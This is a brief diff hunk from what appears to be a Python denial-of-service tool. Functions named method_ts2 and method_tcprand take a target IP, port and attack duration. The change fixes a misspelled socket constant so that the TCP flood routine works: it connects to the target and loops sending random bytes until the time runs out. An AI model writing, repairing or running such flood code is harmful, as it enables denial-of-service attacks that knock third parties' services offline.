@@ -105,7 +105,7 @@ def method_ts2(ip,port,attacktime):
 def method_tcprand(ip,port,attacktime):
     data = random._urandom(16)
     addr = (ip,port)
-    flood = socket.socket(socket.AF_INET,socket.SOCK_STREAN)
+    flood = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     timeout = time.time() + attacktime
     flood.connect(addr)
     while True:
